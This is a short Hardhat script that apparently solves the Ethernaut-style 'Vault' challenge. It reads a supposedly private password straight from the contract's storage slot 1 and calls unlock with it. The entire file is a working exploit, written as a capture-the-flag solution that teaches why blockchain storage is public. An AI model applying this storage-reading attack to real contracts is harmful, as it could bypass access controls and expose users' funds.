import { ethers } from 'hardhat'
import { Vault } from '../types/typechain/Vault'

async function main() {
  const targetAddr = '0xEaBBEAB41D81e8c577dA0eB9E3eE71B5a7E8894a'

  const factory = await ethers.getContractFactory('Vault')
  const vault = (await factory.attach(targetAddr)) as Vault

  console.log('Contract attached, executing exploit...')
  const password = await ethers.provider.getStorageAt(targetAddr, 1)
  console.log('password', password)

  await vault.unlock(password)
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
